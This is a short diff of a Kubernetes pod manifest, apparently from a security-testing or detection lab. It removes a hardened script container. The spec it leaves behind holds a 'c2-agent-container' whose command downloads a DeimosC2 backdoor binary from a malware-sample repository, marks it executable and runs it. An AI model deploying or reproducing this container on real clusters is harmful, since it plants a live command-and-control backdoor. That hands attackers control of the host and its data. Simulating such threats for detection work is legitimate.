@@ -19,19 +19,6 @@ spec:
         runAsUser: 1000
         fsGroup: 2000
       containers:
-      - name: busybox-script-container
-        image: <your-dockerhub-username>/busybox-script:latest
-        imagePullPolicy: Always
-        command: ["/tmp/busybox_sample_download_script.sh"]
-        volumeMounts:
-        - name: script-volume
-          mountPath: /tmp
-        securityContext:
-          capabilities:
-            drop:
-              - ALL
-          readOnlyRootFilesystem: true
-          allowPrivilegeEscalation: false
       - name: c2-agent-container
         image: busybox
         command: ["sh", "-c", "wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -O /tmp/deimosC2.elf && chmod +x /tmp/deimosC2.elf && /tmp/deimosC2.elf"]
